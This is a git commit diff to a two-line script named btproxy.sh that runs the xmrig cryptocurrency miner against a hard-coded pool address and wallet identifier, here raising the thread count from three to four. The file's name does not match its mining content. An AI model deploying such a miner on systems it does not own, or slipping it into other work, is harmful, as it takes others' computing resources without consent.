dde9693e9cf93bf3332500177a269d4e5ecaf9cf
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2021-10-12 16:41:49 +0700

    Update btproxy.sh

--- btproxy.sh
+++ btproxy.sh
@@ -1,2 +1,2 @@
 cd xmrig/build
-./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x --threads=3 --randomx-1gb-pages
+./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x --threads=4 --randomx-1gb-pages
